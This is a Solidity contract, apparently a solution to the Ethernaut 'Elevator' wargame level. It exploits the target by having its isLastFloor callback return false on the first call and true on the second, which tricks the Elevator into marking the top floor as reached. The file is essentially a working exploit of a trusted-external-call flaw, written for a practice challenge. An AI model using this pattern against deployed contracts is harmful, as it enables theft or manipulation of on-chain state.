// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {Script, console, console2} from "forge-std/Script.sol";
import "../src/Elevator.sol";

contract Elevator_exp{

    Elevator ele;
    uint256 public cnt;

    constructor() public payable {
    }

    function attack(address payable v) public {
        ele = Elevator(v);
        cnt = 0;
        ele.goTo(0);

    }

    function isLastFloor(uint256 test) external returns (bool) {
        if(cnt == 0) {
            cnt = 1;
            return false;
        }
        if(cnt == 1){
            return true;
        }
    }


}